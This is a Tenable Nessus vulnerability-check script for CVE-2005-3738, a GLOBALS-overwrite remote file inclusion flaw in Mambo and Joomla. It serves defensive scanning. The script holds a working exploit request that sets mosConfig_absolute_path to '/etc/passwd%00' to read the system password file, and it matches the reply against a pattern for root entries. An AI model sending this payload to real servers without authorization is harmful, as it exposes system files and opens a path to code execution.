#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(20222);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-3738");
  script_bugtraq_id(15461);
  script_xref(name:"OSVDB", value:"20915");

  script_name(english:"Mambo Open Source / Joomla! GLOBALS Variable Remote File Inclusion");
  script_summary(english:"Tries to read a file using Mambo Open Source / Joomla!");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote installation of Mambo Open Source or Joomla! allows an
attacker to overwrite the GLOBALS variable array when PHP's
'register_globals' setting is disabled.  An unauthenticated attacker
may be able to exploit this issue to view arbitrary files on the
remote host and to execute arbitrary PHP code, possibly taken from
third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2005-11/0520.html" );
 script_set_attribute(attribute:"see_also", value:"http://forum.mamboserver.com/showthread.php?t=66154" );
 script_set_attribute(attribute:"see_also", value:"http://www.joomla.org/content/view/498/74/" );
 script_set_attribute(attribute:"solution", value:
"If using Mambo Open Source, apply the patch from the vendor.  If using
Joomla!, upgrade to version 1.0.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:N/I:P/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
foreach dir (dirs)
{
  # Try to exploit the flaw to read /etc/passwd.
  #
  # nb: this particular attack requires magic_quotes_gpc be disabled.
  path = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "_REQUEST=&",
      "_REQUEST[option]=com_content&",
      "_REQUEST[Itemid]=1&",
      "GLOBALS=&",
      "mosConfig_absolute_path=", path
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  # There's a problem if...
  if (
    # we're being paranoid and got nothing back (eg, magic_quotes_gpc
    # was enabled and display_errors was disabled) or...
    (report_paranoia > 1 && isnull(res)) ||

    (
      # we got a response and...
      !isnull(res) &&
      (
        # there's an entry for root or...
        egrep(string:res, pattern:"root:.*:0:[01]:") ||
        # we get an error saying "failed to open stream" or "Failed opening".
        #
        # nb: this suggests magic_quotes_gpc was enabled but remote URLs
        #     might still work.
        egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
        "Failed opening required '/etc/passwd" >< res
      )
    )
  )
  {
    if (!isnull(res) && report_verbosity > 0)
    {
      contents = strstr(res, '<div class="content_outline">');
      if (contents)
      {
        contents = strstr(contents, ">") - ">";
        if (contents) contents = contents - strstr(contents, "<");
        if (contents) contents = ereg_replace(pattern:"^[^a-z_]+", replace:"", string:contents);
      }
      # nb: with Joomla, the contents are between the final "</div>" and "</body>".
      else
      {
        contents = res - strstr(res, "</body>");
        while (contents && "</div>" >< contents)
          contents = strstr(contents, "</div>") - "</div>";
      }
    }

    if (contents)
      security_note(port:port, extra: contents);
    else 
      security_note(port:port);

    exit(0);
  }
}
